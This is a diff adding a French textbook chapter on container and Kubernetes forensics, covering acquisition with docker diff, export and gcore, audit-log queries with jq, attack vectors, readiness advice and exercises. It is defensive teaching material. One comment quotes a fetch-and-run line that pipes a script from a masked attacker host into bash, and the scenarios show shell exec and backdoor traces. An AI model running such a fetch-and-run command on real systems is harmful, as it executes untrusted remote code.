@@ -1,0 +1,615 @@
+% ============================================================================
+% Fichier  : partie5/P05_C24_containers_cloud_native.tex
+% Titre    : Forensique Cloud-Native et Conteneurs
+% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
+% Version  : 1.0 -- Juin 2026
+% ============================================================================
+
+\chapter{Forensique Cloud-Native et Conteneurs}
+\label{chap:containers}
+
+\epigraph{%
+    « Un conteneur compromis peut avoir disparu avant même que vous
+    ayez fini de lire l'alerte qui vous en informe. »%
+}{Réalité opérationnelle du cloud-native}
+
+\niveauChapitre{Expert}{%
+    Notions de Docker et Kubernetes requises. Chapitre~\ref{chap:for-cloud}
+    (forensique cloud IaaS) indispensable~: ce chapitre descend d'un
+    niveau d'abstraction supplémentaire.%
+}
+
+\begin{boxobjectifs}
+\begin{itemize}
+    \item Comprendre l'architecture conteneurs~/~orchestrateur et
+          identifier où résident les données forensiques à chaque couche.
+    \item Acquérir l'état d'un conteneur Docker compromis avant
+          sa destruction~: système de fichiers, processus, réseau.
+    \item Analyser les journaux et événements Kubernetes pour
+          reconstituer une chronologie d'attaque cloud-native.
+    \item Gérer l'éphéméralité extrême des conteneurs~: stratégies
+          de capture en environnement de production.
+    \item Identifier les vecteurs d'attaque spécifiques aux
+          conteneurs~: évasion, images compromises, secrets exposés.
+    \item Documenter une investigation cloud-native dans le respect
+          des principes de custody adaptés à cet environnement.
+\end{itemize}
+\end{boxobjectifs}
+
+\bigskip
+
+% ============================================================================
+\section*{Pourquoi un chapitre dédié aux conteneurs}
+% ============================================================================
+
+Le Chapitre~\ref{chap:for-cloud} a traité la forensique cloud au niveau
+de la machine virtuelle~: CloudTrail enregistre qui a lancé une instance
+EC2, un snapshot EBS préserve son disque. Mais l'architecture moderne
+des applications cloud ne s'arrête pas aux VMs~: à l'intérieur de
+chaque VM tournent désormais des dizaines, parfois des centaines de
+\textbf{conteneurs}, des unités d'exécution légères, créées et
+détruites en quelques secondes, orchestrées par des systèmes comme
+\termecle{Kubernetes}\index{Kubernetes}.
+
+Cette architecture pousse l'éphéméralité (déjà identifiée au
+Ch.~\ref{chap:for-cloud} comme défi central du cloud) à son extrême~:
+un conteneur compromis peut être détruit par l'orchestrateur lui-même (pour cause de redémarrage automatique, de mise à l'échelle, ou
+de politique de sécurité) avant que l'investigateur n'ait eu le
+temps d'intervenir.
+
+\separateur
+
+% ============================================================================
+\section{Architecture Conteneurs~: où Résident les Données}
+\label{sec:architecture-conteneurs}
+% ============================================================================
+
+\subsection{Les couches d'abstraction}
+
+\begin{tableaucours}{p{2.8cm}p{3.5cm}p{5.5cm}}{%
+    \tableauHeader{Couche} &
+    \tableauHeader{Durée de vie typique} &
+    \tableauHeader{Données forensiques}
+}
+\textbf{Image} (Docker Image) & Persistante (registre) &
+    Code applicatif, dépendances, configuration~; analysable
+    hors-ligne comme un firmware (Ch.~\ref{chap:for-iot}) \\
+\textbf{Conteneur} (instance d'exécution) & Secondes à jours &
+    Processus actifs, système de fichiers en écriture
+    (\textit{layer} superposé), variables d'environnement \\
+\textbf{Pod} (Kubernetes~: groupe de conteneurs) & Minutes à mois &
+    Logs agrégés, réseau interne au Pod, volumes partagés \\
+\textbf{N\oe ud} (machine hébergeant les Pods) & Heures à années &
+    Logs systemd/journald (Ch.~\ref{chap:for-sys}), logs kubelet,
+    images Docker en cache \\
+\textbf{Cluster} (orchestrateur complet) & Persistant &
+    \texttt{etcd} (base de données d'état)~; audit logs API
+    Kubernetes~; configuration RBAC \\
+\end{tableaucours}
+\vspace{-0.8em}
+\begin{center}{\small\itshape Tableau~24.1. Couches d'abstraction et données forensiques}\end{center}
+
+\subsection{Le défi de l'éphéméralité extrême}
+
+\begin{boxCRO}
+\textbf{Analyse CRO. Éphéméralité des conteneurs}
+
+$\mathcal{R}$ (Fiabilité)~: capturer l'état exact d'un conteneur
+en cours d'exécution avant sa destruction nécessite une réaction
+en quelques secondes à minutes. Un conteneur Kubernetes peut être
+détruit automatiquement par une politique de \textit{liveness probe}
+(redémarrage si le processus principal échoue) sans intervention
+humaine.
+
+$\mathcal{O}$ (Opposabilité)~: l'absence de preuve directe (le
+conteneur a disparu) ne signifie pas l'absence d'incident, mais
+elle complique significativement la démonstration. Les logs
+externalisés (Section~\ref{sec:logs-k8s}) deviennent la source
+probatoire principale.
+
+$\mathcal{C}$ (Confidentialité)~: un cluster Kubernetes multi-tenant
+héberge souvent les charges de travail de plusieurs clients sur
+la même infrastructure physique, l'investigation d'un Pod doit
+être rigoureusement cantonnée à son périmètre (\textit{namespace}).
+
+\cro{$\downarrow$ cantonnement namespace}{$\downarrow\downarrow$ disparition rapide}{$\sim$ dépend des logs externalisés}
+
+\textbf{Conséquence opérationnelle~:} contrairement aux Ch.~14--18
+où l'acquisition pouvait souvent attendre quelques heures, la
+forensique conteneur exige une \textbf{architecture de détection
+et réponse automatisée} (Section~\ref{sec:strategie-capture})
+mise en place \emph{avant} l'incident.
+\end{boxCRO}
+
+% ============================================================================
+\section{Acquisition d'un Conteneur Docker Compromis}
+\label{sec:acquisition-docker}
+% ============================================================================
+
+\subsection{Capture de l'état d'un conteneur en cours d'exécution}
+
+\begin{boxoutils}{Acquisition forensique d'un conteneur Docker actif}
+\begin{lstlisting}[language=bash_forensique]
+# PRINCIPE : agir vite, dans l'ordre de volatilite (RFC 3227
+# adapte aux conteneurs, cf. Ch. 21 pour la logique generale)
+
+# Etape 1 : identifier le conteneur suspect
+docker ps
+# CONTAINER ID   IMAGE          STATUS         NAMES
+# a3f7b29c8e1d   webapp:latest  Up 47 minutes  prod-webapp-3
+
+# Etape 2 : capturer les processus actifs DANS le conteneur
+docker top a3f7b29c8e1d -eo pid,ppid,cmd,etime
+# Revele les processus en cours -- equivalent du Volatility
+# pslist (Ch. 14) mais a l'echelle du conteneur
+
+# Etape 3 : capturer les connexions reseau du conteneur
+docker exec a3f7b29c8e1d cat /proc/net/tcp
+# Ou, depuis l'hote (sans modifier le conteneur) :
+nsenter -t $(docker inspect -f '{{.State.Pid}}' a3f7b29c8e1d) \
+    -n netstat -tupln
+
+# Etape 4 : capturer les logs du conteneur (stdout/stderr)
+docker logs a3f7b29c8e1d --timestamps > /output/container_logs.txt
+
+# Etape 5 : capturer le diff du systeme de fichiers
+# (ce qui a ete modifie par rapport a l'image d'origine)
+docker diff a3f7b29c8e1d > /output/container_fs_diff.txt
+# Resultat type :
+# A /tmp/malware.sh        <- fichier Ajoute
+# C /etc/passwd            <- fichier Change
+# D /var/log/auth.log      <- fichier Detruit (anti-forensique !)
+
+# Etape 6 : exporter le systeme de fichiers complet du conteneur
+docker export a3f7b29c8e1d -o /output/container_export.tar
+sha256sum /output/container_export.tar > /output/container_hash.txt
+
+# Etape 7 : capturer l'image source pour comparaison
+docker save webapp:latest -o /output/image_source.tar
+# Comparer image_source (etat propre) avec container_export
+# (etat compromis) pour isoler precisement les modifications
+
+# Etape 8 : SEULEMENT APRES capture complete -- arreter le conteneur
+# (preserve l'etat pour investigation differee si necessaire)
+docker pause a3f7b29c8e1d   # gele sans detruire
+# docker stop -- a eviter en premier reflexe : declenche parfois
+# des hooks de nettoyage (anti-forensique involontaire)
+\end{lstlisting}
+\end{boxoutils}
+
+\begin{boxalert}
+\textbf{\texttt{docker diff}~: l'outil le plus sous-utilisé en
+forensique conteneur}
+
+La commande \texttt{docker diff} révèle en une seconde tous les
+fichiers ajoutés, modifiés ou supprimés par rapport à l'image
+d'origine immuable. C'est l'équivalent conteneur du \texttt{\$UsnJrnl}
+(Ch.~\ref{chap:for-sys})~: elle révèle non seulement l'activité
+malveillante mais aussi les \textbf{tentatives de suppression
+de logs internes} au conteneur (marquées \texttt{D} dans la sortie).
+Toujours exécuter cette commande \textbf{avant} tout arrêt du conteneur.
+\end{boxalert}
+
+\subsection{Capture mémoire d'un conteneur}
+
+\begin{boxoutils}{Capture mémoire d'un processus conteneurisé}
+\begin{lstlisting}[language=bash_forensique]
+# Un conteneur partage le noyau de l'hote -- pas d'hyperviseur
+# separe comme pour une VM. La capture memoire cible le ou les
+# processus du conteneur depuis l'hote.
+
+# Identifier le PID hote correspondant au conteneur
+CONTAINER_PID=$(docker inspect -f '{{.State.Pid}}' a3f7b29c8e1d)
+echo $CONTAINER_PID
+# 48291
+
+# Capturer la memoire du processus (sur l'hote, avec privileges)
+gcore -o /output/container_memory $CONTAINER_PID
+# Genere /output/container_memory.48291
+
+# Analyse avec Volatility 3 (meme outil que Ch. 14, profil Linux)
+python3 vol.py -f /output/container_memory.48291 \
+    linux.bash    # historique bash si shell actif dans le conteneur
+python3 vol.py -f /output/container_memory.48291 \
+    linux.pslist  # processus enfants du processus principal
+
+# Alternative : capture de la memoire complete de l'hote
+# (capture TOUS les conteneurs, plus lourd mais plus complet)
+# -- utiliser LiME (Linux Memory Extractor) comme au Ch. 14
+# pour les systemes Linux
+\end{lstlisting}
+\end{boxoutils}
+
+% ============================================================================
+\section{Logs et Événements Kubernetes}
+\label{sec:logs-k8s}
+% ============================================================================
+
+\subsection{Architecture de logging Kubernetes}
+
+\begin{tableaucours}{p{3.0cm}p{4.0cm}p{4.5cm}}{%
+    \tableauHeader{Source} &
+    \tableauHeader{Contenu} &
+    \tableauHeader{Rétention typique}
+}
+\textbf{API Server Audit Log} & Chaque appel à l'API Kubernetes~:
+    qui, quoi, quand &
+    Selon configuration (souvent~7--30~jours)~; \textbf{le plus
+    important pour la forensique} \\
+\textbf{Kubelet logs} & Activité du nœud~: démarrage/arrêt de Pods &
+    Logs systemd locaux (Ch.~\ref{chap:for-sys})~; rotation rapide \\
+\textbf{Pod logs} & \texttt{stdout}/\texttt{stderr} de l'application &
+    Perdus à la suppression du Pod sauf agrégation externe
+    (ELK, Loki) \\
+\textbf{etcd} & État complet du cluster (configuration, secrets) &
+    Persistant tant que le cluster existe~; snapshot recommandé \\
+\textbf{Events} (\texttt{kubectl get events}) & Événements du cycle
+    de vie (création, échec, redémarrage) &
+    \textbf{1~heure par défaut}, extrêmement volatile \\
+\end{tableaucours}
+\vspace{-0.8em}
+\begin{center}{\small\itshape Tableau~24.2. Sources de logs Kubernetes}\end{center}
+
+\begin{boxoutils}{Extraction de l'audit log Kubernetes API Server}
+\begin{lstlisting}[language=bash_forensique]
+# Format de l'Audit Log Kubernetes (JSON Lines)
+# Localisation typique : /var/log/kubernetes/audit.log
+# (ou exporte vers un SIEM -- cf. principe de forwarding, Ch. 21)
+
+# Filtrer les actions sur un namespace specifique
+cat audit.log | jq 'select(.objectRef.namespace == "production")'
+
+# Identifier qui a cree/modifie/supprime des ressources
+cat audit.log | jq -r 'select(.verb == "create" or .verb ==
+    "delete") | [.requestReceivedTimestamp, .verb,
+    .objectRef.resource, .objectRef.name,
+    .user.username, .sourceIPs[0]] | @csv'
+
+# Detecter l'execution de commandes dans un Pod (kubectl exec)
+# -- vecteur d'attaque frequent une fois un acces initial obtenu
+cat audit.log | jq 'select(.objectRef.subresource == "exec")'
+# Resultat type :
+# {
+#   "verb": "create",
+#   "objectRef": {"resource": "pods", "name": "prod-webapp-3",
+#                  "subresource": "exec"},
+#   "user": {"username": "system:serviceaccount:default:ci-cd"},
+#   "requestReceivedTimestamp": "2026-03-13T02:17:30Z"
+# }
+# -- un compte de service CI/CD executant un kubectl exec
+#    en pleine nuit est hautement suspect
+
+# Detecter la creation de Pods avec privileges eleves
+# (vecteur d'evasion de conteneur frequent)
+cat audit.log | jq 'select(.verb == "create" and
+    .objectRef.resource == "pods") |
+    select(.requestObject.spec.containers[].securityContext.privileged
+    == true)'
+\end{lstlisting}
+\end{boxoutils}
+
+\begin{boxscenario}{Reconstitution d'une attaque Kubernetes, cas MVOM étendu}
+Extension de l'affaire MVOM (Ch.~\ref{chap:for-cloud})~: TRANSBOIS~SA
+utilisait en réalité un cluster Kubernetes pour héberger ses applications.
+L'audit log API Server révèle~:
+
+\begin{lstlisting}[language=bash_forensique]
+02:14:09  CREATE  pods/exec  prod-webapp-3  user:ci-cd-sa
+          IP:185.220.XX.XX
+02:14:15  CREATE  pods/exec  prod-webapp-3  user:ci-cd-sa
+          subresource:exec  command:["/bin/sh"]
+02:16:50  UPDATE  pods/prod-webapp-3  user:ci-cd-sa
+          (modification de fichiers via exec, pas de trace
+           directe dans audit log -- voir docker diff)
+02:19:45  DELETE  pods/prod-webapp-3  user:system:kube-scheduler
+          reason:Evicted (le pod a ete automatiquement detruit
+          par l'orchestrateur suite a une alerte ressources)
+\end{lstlisting}
+
+\textbf{Constatation~:} l'audit log API Server enregistre une
+création de session \texttt{exec} sur le Pod \texttt{prod-webapp-3}
+à 02h14:15, initiée par le compte de service \texttt{ci-cd-sa}
+depuis l'IP \texttt{185.220.XX.XX}.\\[0.3ex]
+\textbf{Analyse~:} la destruction automatique du Pod à 02h19:45
+(raison~: \texttt{Evicted}, déclenchée par l'orchestrateur
+lui-même et non par l'attaquant) illustre la fragilité probatoire
+spécifique aux environnements cloud-native~: \textbf{le système
+a lui-même détruit la preuve principale} (le conteneur compromis)
+dans le cadre de son fonctionnement normal, 5~minutes et~30~secondes
+après l'intrusion. Seul l'audit log API Server, externalisé
+vers un SIEM distinct du cluster, a permis de reconstituer
+cette chronologie.
+\end{boxscenario}
+
+% ============================================================================
+\section{Vecteurs d'Attaque Spécifiques aux Conteneurs}
+\label{sec:vecteurs-attaque}
+% ============================================================================
+
+\subsection{Images compromises}
+
+\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
+    \tableauHeader{Vecteur} &
+    \tableauHeader{Mécanisme} &
+    \tableauHeader{Trace forensique}
+}
+\textbf{Image malveillante} & Image publique sur Docker~Hub
+    contenant un payload caché &
+    Hash de l'image~; comparaison avec le registre officiel~;
+    \texttt{docker history} pour voir les couches \\
+\textbf{Dépendance compromise} & Bibliothèque tierce incluse
+    dans l'image (\textit{supply chain attack}) &
+    Analyse du \texttt{Dockerfile}~/ \texttt{requirements.txt}~;
+    scan de vulnérabilités (Trivy, Grype) \\
+\textbf{Secrets exposés} & Clés API, mots de passe codés en dur
+    dans l'image &
+    \texttt{docker history --no-trunc}~; scan avec
+    \texttt{trufflehog} ou \texttt{gitleaks} \\
+\textbf{Évasion de conteneur} & Exploitation d'une vulnérabilité
+    pour sortir du conteneur vers l'hôte &
+    Logs kernel (\texttt{dmesg})~; alertes runtime
+    (Falco)~; processus inattendus sur l'hôte \\
+\end{tableaucours}
+\vspace{-0.8em}
+\begin{center}{\small\itshape Tableau~24.3. Vecteurs d'attaque conteneurs et traces forensiques}\end{center}
+
+\begin{boxoutils}{Analyse forensique d'une image Docker suspecte}
+\begin{lstlisting}[language=bash_forensique]
+# Examiner l'historique des couches de l'image (sans l'executer)
+docker history --no-trunc webapp:latest
+# Revele chaque commande RUN/COPY/ADD ayant construit l'image
+# -- une commande "RUN curl http://185.220.XX.XX/payload.sh |
+#    bash" serait visible ici
+
+# Extraire et analyser le contenu de l'image (comme un firmware,
+# cf. Ch. 18 -- meme logique avec Binwalk)
+docker save webapp:latest -o image.tar
+tar -xf image.tar -C /output/image_extracted/
+# Chaque couche est un fichier layer.tar -- extraire et analyser
+
+# Scanner les vulnerabilites connues (CVE)
+trivy image webapp:latest
+# Resultat type :
+# webapp:latest (alpine 3.18)
+# Total: 14 (HIGH: 3, CRITICAL: 1)
+# CVE-2024-XXXX  openssl  CRITICAL  Remote Code Execution
+
+# Rechercher des secrets codes en dur
+trufflehog docker --image webapp:latest
+# Detecte : cles AWS, tokens API, mots de passe en clair dans
+# les couches de l'image (meme si supprimes dans une couche
+# ulterieure -- ils restent dans l'historique des couches !)
+
+# Comparer le hash de l'image avec le registre officiel
+docker inspect webapp:latest --format='{{.Id}}'
+# Comparer avec le digest publie sur Docker Hub / registre prive
+# Une divergence indique une image modifiee localement
+\end{lstlisting}
+\end{boxoutils}
+
+\begin{boiteRemarque}{Les secrets supprimés restent dans l'historique des couches}
+Une erreur fréquente des développeurs~: ajouter un secret (clé API)
+dans une couche Docker, puis le supprimer dans une couche ultérieure
+en pensant l'avoir effacé. \textbf{Le secret reste accessible} dans
+l'historique des couches de l'image, car Docker conserve chaque
+couche indépendamment. C'est un parallèle direct avec le wiping
+de fichiers (Ch.~\ref{chap:anti-for})~: la suppression apparente
+ne supprime pas la donnée sous-jacente. Cette caractéristique est
+à la fois une faille de sécurité courante \emph{et} une opportunité
+forensique pour l'investigateur.
+\end{boiteRemarque}
+
+% ============================================================================
+\section{Stratégie de Capture en Production}
+\label{sec:strategie-capture}
+% ============================================================================
+
+\subsection{Pourquoi l'acquisition réactive est insuffisante}
+
+Contrairement aux scénarios des Chapitres~\ref{chap:for-sys}
+à~\ref{chap:for-iot} où l'investigateur arrive après l'incident avec
+le temps de mettre en place une acquisition méthodique, l'éphéméralité
+extrême des conteneurs exige une \textbf{architecture préventive}.
+
+\begin{boxPNC}
+\textbf{Recommandations architecturales pour la \textit{readiness}
+forensique cloud-native}
+
+\begin{enumerate}
+    \item \textbf{Externalisation systématique des logs}~: agrégation
+          en temps réel (Fluentd, Loki) vers un système distinct
+          du cluster, avec rétention minimale de~90~jours.
+    \item \textbf{Audit log API Server activé et exporté}~:
+          configuration \texttt{Metadata} ou \texttt{RequestResponse}
+          (niveau de détail) selon la criticité~; export immédiat
+          hors du cluster.
+    \item \textbf{Politique d'\textit{eviction} documentée}~: en cas
+          d'incident suspecté, désactiver temporairement
+          l'\textit{auto-scaling} et les redémarrages automatiques
+          pour préserver l'état du conteneur compromis.
+    \item \textbf{Runtime security monitoring}~: outils comme
+          \textbf{Falco} détectent et alertent en temps réel sur
+          les comportements anormaux (exécution de shell inattendue,
+          accès fichier sensible), avec capture automatique du
+          contexte au moment de l'alerte.
+    \item \textbf{Snapshots etcd réguliers}~: préservent l'état
+          complet de la configuration du cluster à intervalles
+          définis, indépendamment des Pods individuels.
+\end{enumerate}
+\end{boxPNC}
+
+\subsection{Procédure d'urgence~: les 5 premières minutes}
+
+\begin{boxoutils}{Checklist d'urgence -- incident conteneur détecté}
+\begin{lstlisting}[language=bash_forensique]
+# MINUTE 0-1 : geler la situation
+kubectl label pod prod-webapp-3 quarantine=true
+    --namespace=production
+# Isoler via NetworkPolicy plutot que supprimer immediatement
+kubectl annotate pod prod-webapp-3 forensics.io/preserve=true
+# (annotation personnalisee pour signaler aux controllers
+#  de ne pas recycler ce pod automatiquement, si configure)
+
+# MINUTE 1-3 : capturer l'etat du conteneur
+docker diff <container-id>
+docker logs <container-id> --timestamps
+docker top <container-id> -eo pid,ppid,cmd
+
+# MINUTE 3-5 : exporter et hasher
+docker export <container-id> -o /output/evidence.tar
+sha256sum /output/evidence.tar
+
+# APRES : analyse approfondie sans pression temporelle,
+# en suivant les procedures des Ch. 14 (systeme) et Ch. 15 (reseau)
+# sur les donnees exportees
+\end{lstlisting}
+\end{boxoutils}
+
+\separateur
+
+% --- Encadré lab NDAP SUKULU ---
+\begin{boiteRemarque}{Notions mobilisées par le laboratoire INA-LAB-11}
+\begin{itemize}
+    \item \textbf{Journal d'audit Kubernetes}~: une session
+          \texttt{kubectl exec} apparaît comme un \texttt{create} sur la
+          sous-ressource \texttt{pods/exec}~; le compte est dans
+          \texttt{user.username}, la commande dans l'URI de la requête
+          (\texttt{\%2Fbin\%2Fsh} pour \texttt{/bin/sh}).
+    \item \textbf{Destruction par l'orchestrateur}~: un pod peut être
+          supprimé par le système lui-même (éviction)~; la raison figure dans
+          les \texttt{annotations} de l'événement (\texttt{reason}). La
+          preuve volatile disparaît avec le pod~: capturer avant.
+    \item \textbf{\texttt{docker diff}}~: il liste, par rapport à l'image,
+          les fichiers ajoutés (\texttt{A}), modifiés (\texttt{C}) et
+          supprimés (\texttt{D})~; un exécutable ajouté au nom d'un processus
+          du noyau, un journal supprimé sont des indices forts.
+    \item \textbf{Image substituée}~: l'empreinte (\emph{digest}) de l'image
+          en exécution, comparée à celle du registre, révèle une image
+          remplacée.
+\end{itemize}
+\end{boiteRemarque}
+
+\begin{boxresume}
+\textbf{Ce qu'il faut retenir de ce chapitre~:}
+\begin{itemize}
+    \item \textbf{Cinq couches d'abstraction}~: Image (persistante,
+          analysable comme un firmware) $\to$ Conteneur (secondes
+          à jours) $\to$ Pod $\to$ N\oe ud $\to$ Cluster. Chaque
+          couche a ses propres données forensiques.
+
+    \item \textbf{\texttt{docker diff} en premier réflexe}~: révèle
+          en une commande tous les fichiers ajoutés, modifiés ou
+          supprimés par rapport à l'image d'origine immuable, équivalent conteneur du \texttt{\$UsnJrnl}.
+
+    \item \textbf{L'audit log API Server Kubernetes} est la source
+          probatoire la plus importante~: contrairement aux Pod logs
+          (perdus à la suppression) et aux Events (rétention~1h),
+          il peut être externalisé et conservé durablement.
+
+    \item \textbf{L'orchestrateur peut détruire la preuve lui-même}~:
+          \textit{eviction}, \textit{auto-scaling}, redémarrage
+          automatique sont des fonctionnements normaux qui
+          anéantissent l'état d'un conteneur compromis. C'est
+          un défi structurel propre au cloud-native.
+
+    \item \textbf{Les secrets supprimés restent dans l'historique
+          des couches Docker}, parallèle direct avec le wiping
+          de fichiers (Ch.~\ref{chap:anti-for}). Utiliser
+          \texttt{docker history --no-trunc} et des scanners
+          de secrets (trufflehog, gitleaks).
+
+    \item \textbf{La \textit{readiness} prime sur la réactivité}~:
+          contrairement aux scénarios précédents, l'éphéméralité
+          extrême exige une architecture préventive (externalisation
+          des logs, runtime monitoring avec Falco, politiques
+          d'\textit{eviction} documentées) mise en place
+          \emph{avant} l'incident.
+\end{itemize}
+\end{boxresume}
+
+\bigskip
+
+\begin{boxexo}[title={\ding{45}\quad Exercice~24.1. Identifier les sources \niveaubase}]
+Pour chacune des questions suivantes, identifiez la source de
+données la plus appropriée (Tableau~24.1 ou~24.2) et la commande
+pour l'obtenir~:
+\begin{enumerate}[(a)]
+    \item Quels fichiers un conteneur a-t-il modifiés par rapport
+          à son image d'origine~?
+    \item Qui a exécuté une commande \texttt{kubectl exec} sur un
+          Pod en production la nuit dernière~?
+    \item Un conteneur contient-il des clés API codées en dur,
+          même si elles ont été supprimées dans une couche
+          ultérieure du Dockerfile~?
+    \item Quel processus tournait dans un conteneur juste avant
+          sa destruction par l'orchestrateur~?
+\end{enumerate}
+\end{boxexo}
+
+\begin{boxexo}[title={\ding{45}\quad Exercice~24.2. Analyse de docker diff \niveaumoyen}]
+La commande \texttt{docker diff prod-api-7} sur un conteneur
+suspecté compromis donne~:
+\begin{lstlisting}[language=bash_forensique]
+A /tmp/.hidden/backdoor.py
+A /tmp/.hidden/requirements_extra.txt
+C /etc/crontab
+C /app/config.yaml
+D /var/log/app/access.log
+D /var/log/app/error.log
+\end{lstlisting}
+\begin{enumerate}[(a)]
+    \item Interprétez chaque ligne~: que signifient A, C, D~?
+    \item Quelle hypothèse formulez-vous sur l'objectif de
+          l'attaquant à partir de la modification de
+          \texttt{/etc/crontab}~? Quelle technique du Ch.~18
+          (IoT) cela rappelle-t-il~?
+    \item Les fichiers \texttt{access.log} et \texttt{error.log}
+          ont été supprimés (D). Cette suppression elle-même
+          a-t-elle laissé une trace~? Où la chercheriez-vous~?
+    \item Rédigez les 3~premières constatations de votre rapport
+          à partir de ce \texttt{docker diff}, en respectant
+          la structure du Ch.~\ref{chap:rapport}.
+\end{enumerate}
+\end{boxexo}
+
+\begin{boxexo}[title={\ding{45}\quad Exercice~24.3. Incident Kubernetes complet \niveauexpert}]
+Une startup camerounaise de paiement mobile (architecture
+Kubernetes sur infrastructure cloud) signale une activité suspecte~:
+un Pod traitant les transactions a présenté un pic de trafic réseau
+sortant anormal pendant 8~minutes avant d'être automatiquement
+redémarré par une \textit{liveness probe} ayant échoué. Le Pod
+redémarré est ``propre'', aucune trace de compromission visible
+dans son état actuel.
+\begin{enumerate}[(a)]
+    \item Le Pod compromis original a disparu. Quelles sources
+          de données restent disponibles pour l'investigation~?
+          Classez-les par fiabilité et disponibilité probable.
+    \item Quelles requêtes \texttt{jq} sur l'audit log API Server
+          formuleriez-vous pour reconstituer l'activité sur ce
+          Pod dans la fenêtre de~8~minutes~?
+    \item L'entreprise n'avait pas externalisé ses Pod logs
+          (perdus à la destruction). Quelle recommandation
+          architecturale (Section~\ref{sec:strategie-capture})
+          auriez-vous formulée \emph{avant} cet incident pour
+          éviter cette perte~?
+    \item Cette affaire implique des données financières de
+          clients camerounais (Mobile Money). Quelles obligations
+          de la \loicam{2024/017}~\cite{cameroun2024donnees} (Ch.~12~(UE~SEC4031))
+          s'appliquent à cette startup concernant la notification
+          de l'incident~?
+    \item Rédigez la Synthèse Exécutive (Niveau~1, Ch.~\ref{chap:rapport})
+          de cette investigation, en assumant honnêtement les
+          limites probatoires dues à la perte du Pod original.
+\end{enumerate}
+\end{boxexo}
+
+\bigskip
+
+\begin{boxinfo}
+\textbf{Transition.} La forensique cloud-native montre que la
+capacité d'investigation dépend autant de l'organisation que de
+la technique~: externalisation des journaux, procédures, préparation.
+Le chapitre suivant élargit ce constat à l'échelle des États~: comment
+les systèmes nationaux d'investigation numérique se sont-ils construits,
+et que peut en retenir le Cameroun~?
+\end{boxinfo}
